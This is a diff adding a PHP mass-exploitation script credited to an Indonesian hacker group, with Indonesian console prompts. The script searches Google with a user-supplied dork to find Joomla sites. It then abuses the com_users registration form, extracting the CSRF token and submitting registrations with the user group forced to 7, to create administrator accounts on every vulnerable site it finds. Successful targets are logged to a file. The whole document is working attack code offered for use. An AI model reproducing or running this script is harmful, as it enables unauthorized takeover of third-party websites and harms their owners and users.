@@ -1,0 +1,240 @@
+<?php
+/*
+Coded by RieqyNS13
+Thx to DC, HN, indoXploit
+*/
+class auto{
+    private $url;
+    private $dork; 
+    private $username; 
+    private $password; 
+    private $email; 
+    private $log=null;
+    function __construct($file=null){
+    		echo "\n\n       ########## IndoXploit Coders Team ##########\n";
+			echo "#########  indoXploit.org | Hacker-Newbie.org  #########\n\n";
+        echo "/*Auto Get Token and auto register com_user*/\n\n";
+        echo "[+]Masukkan Dork: ";
+        $fp = fopen("php://stdin", "rb");
+        $dork = fgets($fp);
+        $dork = str_replace(array("\n", "\r", "\r\n"), "", $dork);
+        echo "[+]Masukkan jumlah situs yg discan: ";
+        $total = fgets($fp);
+        $total = str_replace(array("\n", "\r", "\r\n"), "", $total);
+		echo "[+]Masukkan Username: ";
+        $username = fgets($fp);
+        $username = str_replace(array("\n", "\r", "\r\n"), "", $username);
+		echo "[+]Masukkan password: ";
+        $password = fgets($fp);
+        $password = str_replace(array("\n", "\r", "\r\n"), "", $password);
+		echo "[+]Masukkan email: ";
+        $email = fgets($fp);
+        $email = str_replace(array("\n", "\r", "\r\n"), "", $email);
+        fclose($fp);
+        $this->dork = $dork;
+        $this->username = $username;
+        $this->password = $password;
+        $this->email = $email;
+        $this->total = $total;
+        $this->log = $file;
+        $this->scan();
+    }
+    function match($start, $end, $var){
+        return preg_match_all("{".preg_quote($start).'(.*?)'.preg_quote($end)."}is", $var, $m) ? $m[1] : null;
+    }
+    function curl($dork=null, $x, $url=null){
+        $ch = curl_init();
+        if($dork != null && is_numeric($x)){
+            curl_setopt($ch, CURLOPT_URL, "http://www.google.com/custom?q=".urlencode($dork)."&btnG=Search&start=".urlencode($x));
+        }elseif($url != null && $x==null){
+            curl_setopt($ch, CURLOPT_URL, $url);
+        }
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_AUTOREFERER, true );
+        curl_setopt($ch, CURLOPT_FAILONERROR, true);
+        $exec = curl_exec($ch);
+        curl_close($ch);
+        return $exec;
+    }
+    function save($url){
+        if($this->log != null){
+            $fp = @fopen($this->log, "a") or die("cant open file");
+            fwrite($fp, $url);
+            fclose($fp);
+        }else return false;
+    }
+    function parse($urls){
+        for($a=0; $a<count($urls); $a++){
+            $dev = parse_url($urls[$a]);
+            @$scheme[] = $dev['scheme'];
+            @$host[] = $dev['host'];
+        }
+        $unik = array_unique($host);
+        foreach($unik as $key=>$url){
+            $urls_[] = $scheme[$key]."://".$url;
+        }
+        return $urls_;
+    }
+    function waktu($start){
+        $end = time() - $start;
+        $detik = round($end);
+        echo "\n~selesai dalam {$detik} detik\n";
+    }
+    function scan(){
+        $start=0;
+        $total=0;
+        $mulai = time();
+		function ambil($param, $kata1, $kata2){
+	if(strpos($param, $kata1) === FALSE) return FALSE;
+	if(strpos($param, $kata2) === FALSE) return FALSE;
+	$start = strpos($param, $kata1) + strlen($kata1);
+	$end = strpos($param, $kata2, $start);
+	$return = substr($param, $start, $end - $start);
+	return;}
+        do{
+            $i=0;
+            $data = $this->curl($this->dork, $start);
+            $urls = $this->match('<a class="l" href="', '" onmousedown="', $data);
+            if($urls==null){
+                echo "~hasil tidak ada\n";
+                $this->waktu($mulai);
+                exit;
+            }
+            $urls_ = $this->parse($urls);
+            $count = count($urls_);
+            if($count==0){
+                echo "hasil tidak ada atau ada halangan captcha :p\n~keluar";
+                $this->waktu($mulai);
+                exit;
+            }
+			
+            do{
+                $urlq = $urls_[$i];
+				$url_ = $urlq."/index.php?option=com_users&view=registration";
+                $scan = $this->curl(null, null, $url_);
+				echo "\n";
+				echo $urlq;
+				if(preg_match('#jform_password1#is', $scan)){
+					echo "\n";
+					echo "-> wait...";
+					echo "\n";
+					
+				$ch4 = curl_init ("$urlq/index.php?option=com_users&view=registration");
+					curl_setopt ($ch4, CURLOPT_RETURNTRANSFER, 1);
+					curl_setopt ($ch4, CURLOPT_FOLLOWLOCATION, 1);
+					curl_setopt ($ch4, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+					curl_setopt ($ch4, CURLOPT_CONNECTTIMEOUT, 5);
+					curl_setopt ($ch4, CURLOPT_SSL_VERIFYPEER, 0);
+					curl_setopt ($ch4, CURLOPT_SSL_VERIFYHOST, 0);
+					curl_setopt($ch4, CURLOPT_COOKIEJAR,'coker_log');
+					curl_setopt($ch4, CURLOPT_COOKIEFILE,'coker_log');
+					$data = curl_exec ($ch4);
+
+preg_match('/<input type="hidden" name="(.*?)" value="1"/', $data, $f);
+	$token = $f[1];
+				
+						$post = array(
+						'jform[name]' => "Hendragunnawan",
+						'jform[username]' => "Hendragunnawan",
+						'jform[password1]' => "Tu5b0l3d",
+						'jform[password2]' => "asasssssssss",
+						'jform[email1]' => "tu5b0l3d@gmail.com",
+						'jform[email2]' => "tu5b0l3d@gmail.com",
+						'jform[groups][]' => "7",
+						'option' => "com_users",
+						'task' => "registration.register",
+						"$token"=> "1",
+						);
+					
+					$ch2 = curl_init ("$urlq/index.php/component/users/?view=registration");
+					curl_setopt ($ch2, CURLOPT_RETURNTRANSFER, 1);
+					curl_setopt ($ch2, CURLOPT_FOLLOWLOCATION, 1);
+					curl_setopt ($ch2, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+					curl_setopt ($ch2, CURLOPT_CONNECTTIMEOUT, 5);
+					curl_setopt ($ch2, CURLOPT_SSL_VERIFYPEER, 0);
+					curl_setopt ($ch2, CURLOPT_SSL_VERIFYHOST, 0);
+					curl_setopt ($ch2, CURLOPT_POST, 1);
+					@curl_setopt ($ch2, CURLOPT_POSTFIELDS, $post);
+					curl_setopt($ch2, CURLOPT_COOKIEJAR,'coker_log');
+					curl_setopt($ch2, CURLOPT_COOKIEFILE,'coker_log');
+					$data3 = curl_exec ($ch2);
+					
+						if(preg_match('#jform_password1#is', $data3)){
+						echo "-> lagi register ";
+						echo "\n";
+						
+					$post = array(
+						'jform[name]' => "Hendragunnawan",
+						'jform[username]' => "$this->username",
+						'jform[password1]' => "$this->password",
+						'jform[password2]' => "$this->password",
+						'jform[email1]' => "$this->email",
+						'jform[email2]' => "$this->email",
+						'jform[groups][]' => "7",
+						'option' => "com_users",
+						'task' => "registration.register",
+						"$token"=> "1",
+						);
+					
+					$ch2 = curl_init ("$urlq/index.php/component/users/?view=registration");
+					curl_setopt ($ch2, CURLOPT_RETURNTRANSFER, 1);
+					curl_setopt ($ch2, CURLOPT_FOLLOWLOCATION, 1);
+					curl_setopt ($ch2, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+					curl_setopt ($ch2, CURLOPT_CONNECTTIMEOUT, 5);
+					curl_setopt ($ch2, CURLOPT_SSL_VERIFYPEER, 0);
+					curl_setopt ($ch2, CURLOPT_SSL_VERIFYHOST, 0);
+					curl_setopt ($ch2, CURLOPT_POST, 1);
+					@curl_setopt ($ch2, CURLOPT_POSTFIELDS, $post);
+					curl_setopt($ch2, CURLOPT_COOKIEJAR,'coker_log');
+					curl_setopt($ch2, CURLOPT_COOKIEFILE,'coker_log');
+					$data1 = curl_exec ($ch2);	
+				
+				
+					//$ceks = ambil($data1,'<div class="com-user ',' ">');
+					//if($ceks == "registration-complete"){
+					
+					if(preg_match('#Your account has been created#is', $data1)){
+					echo "\n";
+					echo "-> Success";
+					echo "\n";
+					echo "-> Cek Email";
+					echo "\n";
+					echo "\n";
+					$this->save($urlq."<br>");
+					}else{
+                    echo "-> Gagal Daftar";
+					echo "\n";
+					echo "\n";
+				}
+				
+						
+						}else {
+						echo "-> Ngk Bisa Register ";
+						echo "\n";
+						}
+						}
+						else {
+						echo "-> Not Vuln";
+						echo "\n";
+						}
+						
+						
+			
+				
+						
+						
+                $total++;
+                $i++;
+            }while($i<$count && $total<$this->total);
+            $start=$start+10;
+        }while($total<$this->total);
+        $this->waktu($mulai);
+        
+    }
+
+}
+
+$gay = new auto("vuln-com_user.htm");
+?>
